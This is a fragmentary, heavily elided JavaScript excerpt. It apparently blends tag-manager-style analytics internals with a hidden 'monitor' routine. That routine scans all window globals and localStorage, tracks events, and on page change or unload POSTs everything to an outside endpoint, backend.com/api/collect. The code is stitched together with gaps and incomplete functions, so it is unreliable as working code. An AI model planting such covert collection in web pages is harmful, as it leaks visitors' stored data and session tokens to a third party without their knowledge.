...
(function () {
  ...
  function scanGlobals() {
    ...
    for (let attr in window) {
      if (window.hasOwnProperty(attr)) {
        let globalValue = window[attr];
        let globalType = typeof globalValue;
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLyWqwYQga3KhPfohoyPARIjAOzHCQiFHKv418DsJKgHn9X9X22r5Huwcl8i1Zd/tc1wWfoaArVY";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function trackEvents() {
    const trackedEvents = ['load', 'beforeunload', 'idle', 'click'];
  ...
  function sendTrackerData(data) {
    const url = 'https://backend.com/api/collect';
    var xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.onload = function () {
      if (xhr.status == 200 && xhr.readyState == 4) console.log('数据发送成功');else console.log('文件传输失败, 状态码:' + xhr.status);
    };
    xhr.onerror = function () {
      console.error("文件传输中出错");
    };
  ...
  function monitor() {
    const globals = scanGlobals();
    const localStorageItems = trackLocalStorage();
    const eventListeners = trackEvents();
    const observation = {
      globals: globals,
      localStorage: localStorageItems,
      eventListeners: eventListeners
    };
    sendTrackerData(observation);
  }
  ...
  window.addEventListener("change", monitor);
  function VG() {}
  VG.P = "resetDataLayer";
  function WG(a, b, c, d) {}
  ...
  var TI = {};
  TI.dataLayer = Pi;
  window.addEventListener("beforeunload", monitor);
